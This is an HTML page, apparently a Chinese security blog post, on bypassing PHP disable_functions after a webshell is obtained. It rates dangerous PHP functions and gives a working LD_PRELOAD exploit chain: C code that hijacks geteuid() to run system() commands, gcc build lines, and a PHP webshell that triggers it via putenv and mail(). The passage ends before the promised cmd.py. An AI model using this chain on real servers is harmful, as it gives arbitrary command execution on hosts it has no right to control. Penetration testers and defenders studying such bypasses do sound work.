@@ -1,0 +1,1102 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head><!-- hexo injector head_begin start --><script defer src="/injector/toolbox.js"></script><!-- hexo injector head_begin end -->
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/apple-touch-icon.png">
+  <link rel="icon" href="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Tr0y">
+  <meta name="keywords" content="Tr0y, tr0y, Hexo, Blog, 博客, 信息安全">
+  
+    <meta name="description" content="PHP 的 disable_functions 用于禁用一些危险的函数避免被攻击者利用，那么要如何突破这一层呢？">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP disable_functions Bypass 的方法探究">
+<meta property="og:url" content="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/">
+<meta property="og:site_name" content="Tr0y&#39;s Blog">
+<meta property="og:description" content="PHP 的 disable_functions 用于禁用一些危险的函数避免被攻击者利用，那么要如何突破这一层呢？">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/PHPDisalbedfunc/20181002032813395.png!blog">
+<meta property="og:image" content="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png">
+<meta property="article:published_time" content="2018-04-18T01:48:10.000Z">
+<meta property="article:modified_time" content="2021-04-13T09:32:35.000Z">
+<meta property="article:author" content="Tr0y">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="PHP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/PHPDisalbedfunc/20181002032813395.png!blog">
+  
+  
+  
+  <title>PHP disable_functions Bypass 的方法探究 - Tr0y&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/my.css">
+<link rel="stylesheet" href="/css/my-piczoom.css">
+<link rel="stylesheet" href="/css/my-code.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.tr0y.wang","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":60,"cursorChar":"丨","loop":false,"scope":["archives","post","tags","categories","about","links","page","404"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"🌧"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":true,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":5},"lazyload":{"enable":true,"loading_img":"https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":"8e9bf819abf5fa586aeb29b27a17930f","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"HvSx6ik6SYrERWriMqKHJgxY-gzGzoHsz","app_key":"Ehx7kqAi6icjCXaw5jdD5sIs","server_url":"https://hvsx6ik6.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?8e9bf819abf5fa586aeb29b27a17930f";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start --><script defer src="/injector/post.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Tr0y's Blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tr0y&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-books"></i>
+                生命线
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-archive-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/gallery/">
+                <i class="iconfont icon-images"></i>
+                摄影集
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/page.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="PHP disable_functions Bypass 的方法探究"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2018-04-18 01:48" pubdate>
+          2018年4月18日 01:48:10
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          7.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          49 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="经验总结"
+        id="heading-14f81b61393e65e2be86c2b4bcc0434a" role="tab" data-toggle="collapse" href="#collapse-14f81b61393e65e2be86c2b4bcc0434a"
+        aria-expanded="true"
+      >
+        经验总结
+        <span class="list-group-count">(85)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-14f81b61393e65e2be86c2b4bcc0434a"
+           role="tabpanel" aria-labelledby="heading-14f81b61393e65e2be86c2b4bcc0434a">
+        
+        
+          
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2021/12/31/2021/" title="2021 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2021/01/12/flag-in-2021/" title="2021，来立些 flag 吧"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2021，来立些 flag 吧</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2023/01/31/2022/" title="2022 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2022 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/03/15/2023/" title="2023 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2024/05/06/%E4%BA%91%E5%8D%97%E4%B9%8B%E6%97%85/" title="2024 云南之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 云南之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/03/14/2024/" title="2024 年度总结"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 年度总结</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2025/02/20/%E6%96%90%E6%B5%8E%E4%B9%8B%E6%97%85/" title="2024 🇫🇯 斐济之旅"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2024 🇫🇯 斐济之旅</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2019/06/02/CSRF%E6%8C%87%E5%8C%97/" title="CSRF 指北"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CSRF 指北</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2017/06/07/CtfMiscStega/" title="CTF 杂项之隐写术"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">CTF 杂项之隐写术</span>
+        </a>
+      
+    
+      
+      
+        <a href="/2020/09/14/DNS-1-basic/" title="DNS 安全（一）：基础知识复习"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">DNS 安全（一）：基础知识复习</span>
+        </a>
+      
+    
+      
+      
+        <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="list-group-item list-group-item-action">
+          <span class="category-post">More...</span>
+        </a>
+        
+  </div>
+
+          
+  
+    
+    
+    
+    <div class="category-sub row nomargin-x">
+      <a class="category-subitem collapsed
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="过程记录"
+        id="heading-82bd63cbf8d855f8a95d66283f2e4114" role="tab" data-toggle="collapse" href="#collapse-82bd63cbf8d855f8a95d66283f2e4114"
+        aria-expanded="false"
+      >
+        过程记录
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse " id="collapse-82bd63cbf8d855f8a95d66283f2e4114"
+           role="tabpanel" aria-labelledby="heading-82bd63cbf8d855f8a95d66283f2e4114">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/2023/12/22/qwb2023-pyjail/" title="2023 强网杯三道 pyjail 的题解"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">2023 强网杯三道 pyjail 的题解</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP disable_functions Bypass 的方法探究</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：4 年前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>PHP 的 disable_functions 用于禁用一些危险的函数避免被攻击者利用，那么要如何突破这一层呢？</p>
+<span id="more"></span>
+<p>最近在做渗透测试的时候遇到了一个障碍，已经 getshell 了，但是由于 PHP disable_functions 的存在，无法执行系统命令（即使是 <code>ls</code> 这样的命令。后来发现了一些资料，感觉很多干货，也成功了。于是总结了一下。</p>
+<h2 id="disable_functions">disable_functions</h2>
+<p>先来看看哪些函数需要放入 disable_functions：</p>
+<h3 id="passthru">passthru()</h3>
+<p>功能描述：允许执行一个外部程序并回显输出，类似于 exec()。<br />
+危险等级：高</p>
+<h3 id="exec">exec()</h3>
+<p>功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。<br />
+危险等级：高</p>
+<h3 id="system">system()</h3>
+<p>功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。<br />
+危险等级：高</p>
+<p>(windows 下的 `` 执行命令，用的是这个函数)</p>
+<h3 id="chroot">chroot()</h3>
+<p>功能描述：可改变当前 PHP 进程的工作根目录，仅当系统支持 CLI 模式<br />
+PHP 时才能工作，且该函数不适用于 Windows 系统。<br />
+危险等级：高</p>
+<h3 id="chgrp">chgrp()</h3>
+<p>功能描述：改变文件或目录所属的用户组。<br />
+危险等级：高</p>
+<h3 id="chown">chown()</h3>
+<p>功能描述：改变文件或目录的所有者。<br />
+危险等级：高</p>
+<h3 id="shell_exec">shell_exec()</h3>
+<p>功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。<br />
+危险等级：高</p>
+<p>(Linux 下的 `` 用的是这个函数)</p>
+<h3 id="proc_open">proc_open()</h3>
+<p>功能描述：执行一个命令并打开文件指针用于读取以及写入。<br />
+危险等级：高</p>
+<h3 id="proc_get_status">proc_get_status()</h3>
+<p>功能描述：获取使用 proc_open() 所打开进程的信息。<br />
+危险等级：高</p>
+<h3 id="ini_alter">ini_alter()</h3>
+<p>功能描述：是 ini_set() 函数的一个别名函数，功能与 ini_set() 相同。<br />
+具体参见 ini_set()。<br />
+危险等级：高</p>
+<h3 id="ini_set">ini_set()</h3>
+<p>功能描述：可用于修改、设置 PHP 环境配置参数。<br />
+危险等级：高</p>
+<h3 id="ini_restore">ini_restore()</h3>
+<p>功能描述：可用于恢复 PHP 环境配置参数到其初始值。<br />
+危险等级：高</p>
+<h3 id="dl">dl()</h3>
+<p>功能描述：在 PHP 进行运行过程当中（而非启动时）加载一个 PHP 外部模块。<br />
+危险等级：高</p>
+<h3 id="pfsockopen">pfsockopen()</h3>
+<p>功能描述：建立一个 Internet 或 UNIX 域的 socket 持久连接。<br />
+危险等级：高</p>
+<h3 id="symlink">symlink()</h3>
+<p>功能描述：在 UNIX 系统中建立一个符号链接。<br />
+危险等级：高</p>
+<h3 id="popen">popen()</h3>
+<p>功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。<br />
+危险等级：高</p>
+<h3 id="putenv">putenv()</h3>
+<p>功能描述：用于在 PHP 运行时改变系统字符集环境。在低于 5.2.6 版本的 PHP 中，可利用该函数<br />
+修改系统字符集环境后，利用 sendmail 指令发送特殊参数执行系统 SHELL 命令。<br />
+危险等级：高</p>
+<h3 id="phpinfo">phpinfo()</h3>
+<p>功能描述：输出 PHP 环境信息以及相关的模块、WEB 环境等信息。<br />
+危险等级：中</p>
+<h3 id="scandir">scandir()</h3>
+<p>功能描述：列出指定路径中的文件和目录。<br />
+危险等级：中</p>
+<h3 id="syslog">syslog()</h3>
+<p>功能描述：可调用 UNIX 系统的系统层 syslog() 函数。<br />
+危险等级：中</p>
+<h3 id="readlink">readlink()</h3>
+<p>功能描述：返回符号连接指向的目标文件内容。<br />
+危险等级：中</p>
+<h3 id="stream_socket_server">stream_socket_server()</h3>
+<p>功能描述：建立一个 Internet 或 UNIX 服务器连接。<br />
+危险等级：中</p>
+<h3 id="error_log">error_log()</h3>
+<p>功能描述：将错误信息发送到指定位置（文件）。<br />
+安全备注：在某些版本的 PHP 中，可使用 error_log() 绕过 PHP safe mode，<br />
+执行任意命令。<br />
+危险等级：低</p>
+<h2 id="bypass-测试">Bypass 测试</h2>
+<p>首先，删除所有 <code>disable_function</code> 禁用的函数，并打开 <code>display_errors</code></p>
+<h3 id="黑名单绕过">黑名单绕过</h3>
+<p>php 下能够执行系统命令的函数有哪些？</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">assert,<span class="hljs-keyword">system</span>,passthru,<span class="hljs-keyword">exec</span>,pcntl_exec,shell_exec,<span class="hljs-keyword">popen</span>,proc_open,<span class="hljs-string">``</span>(反单引号)<br></code></pre></td></tr></table></figure>
+<p>那么 便可以看看 php.ini 中的 disable_function 漏过了哪些函数，若存在漏网之鱼，直接利用即可</p>
+<h3 id="ld_preload">LD_PRELOAD</h3>
+<p>在 UNIX 的动态链接库的世界中，LD_PRELOAD 是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。简单地说，可注入自己的代码，覆盖原有代码。也就是说如果程序在运行过程中调用了某个标准的动态链接库的函数，那么我们就有机会通过 <code>LD_PRELOAD</code> 来设置它优先加载我们自己编写的程序，实现劫持。</p>
+<p>以 <code>sendmail</code> 为例：(没有 sendmail 的话需要安装)</p>
+<p>使用 <code>readelf -Ws /usr/sbin/sendmail</code> 来看 sendmail 函数都调用了哪些库函数：</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tap">Symbol table &#x27;.dynsym&#x27; contains<span class="hljs-number"> 637 </span>entries:<br>   Num:    Value          Size Type    Bind   Vis      Ndx Name<br>     0:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>NOTYPE  LOCAL  DEFAULT  UND<br>     1:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND SSL_write@OPENSSL_1.0.0 (2)<br>     2:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND SSL_load_error_strings@OPENSSL_1.0.0 (2)<br>     3:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND getegid@GLIBC_2.2.5 (3)<br>     4:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND __errno_location@GLIBC_2.2.5 (3)<br>     5:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND getservbyname@GLIBC_2.2.5 (3)<br>     6:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND pause@GLIBC_2.2.5 (3)<br>     7:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>OBJECT  GLOBAL DEFAULT  UND stdout@GLIBC_2.2.5 (3)<br>     8:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND tzset@GLIBC_2.2.5 (3)<br>     9:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND uname@GLIBC_2.2.5 (3)<br>    10:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND getgroups@GLIBC_2.2.5 (3)<br>    11:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND sasl_setprop@SASL2 (4)<br>    12:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND __ctype_toupper_loc@GLIBC_2.3 (5)<br>    13:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND bind@GLIBC_2.2.5 (3)<br>    14:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND sasl_decode64@SASL2 (4)<br>    15:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND __ctype_tolower_loc@GLIBC_2.3 (5)<br>    16:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND ldap_bind_s@OPENLDAP_2.4_2 (6)<br>    17:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND PEM_read_bio_DHparams@OPENSSL_1.0.0 (7)<br>    18:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND __longjmp_chk@GLIBC_2.11 (8)<br>    19:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND SSLv23_server_method@OPENSSL_1.0.0 (2)<br>    20:<span class="hljs-number"> 0000000000000000 </span>   <span class="hljs-number"> 0 </span>FUNC    GLOBAL DEFAULT  UND sasl_server_start@SASL2 (4)<br>...<br>...<br></code></pre></td></tr></table></figure>
+<p>从中选取一个合适的库函数进行测试</p>
+<ol type="1">
+<li>编制我们自己的动态链接程序。</li>
+<li>通过 putenv 来设置 LD_PRELOAD，让我们的程序优先被调用。</li>
+<li>在 webshell 上用 mail 函数发送一封邮件来触发。</li>
+</ol>
+<p>我们来测试 <code>ls</code>，选取 geteuid()函数来改造：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ls &gt; result.txt&quot;</span>);<br>&#125;   <br><br><span class="hljs-function"><span class="hljs-type">int</span>  <span class="hljs-title">geteuid</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br><span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-built_in">payload</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>当这个共享库中的 <code>geteuid</code> 被调用时，尝试加载 <code>payload()</code> 函数，执行命令。这个测试函数写的很简单，实际应用时可相应调整完善。在攻击机上（注意编译平台应和靶机平台相近，至少不能一个是 32 位一个是 64 位）把它编译为一个位置信息无关的动态共享库：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">gcc -<span class="hljs-keyword">c</span> -fPIC hack.<span class="hljs-keyword">c</span> -o hack<br>gcc -shared hack -o hack.so<br></code></pre></td></tr></table></figure>
+<p>然后把 <code>.so</code> 传到服务器上，再写入 webshell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;LD_PRELOAD=/var/www/hack.so&quot;</span>);<br><span class="hljs-title function_ invoke__">mail</span>(<span class="hljs-string">&quot;[email protected]&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>注意 <code>.so</code> 路径。在浏览器中访问 webshell 就可以执行我们预期的语句了。按照此理，我们可以执行任意特定权限的命令。</p>
+<p>我在最近几天的渗透过程中，用的就是这个办法。那么其实还存在一个问题，若要执行不同的语句，我们还得一次又一次地编译，上传。有没有办法只编译一次然后重复利用呢？可以借助 python</p>
+<p>我们的 hack.c 如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;echo `python cmd.py` &gt; result.txt&quot;</span>);<br>&#125;   <br><br><span class="hljs-function"><span class="hljs-type">int</span>  <span class="hljs-title">geteuid</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br><span class="hljs-built_in">unsetenv</span>(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-built_in">payload</span>();<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>cmd.py 如下：</p>
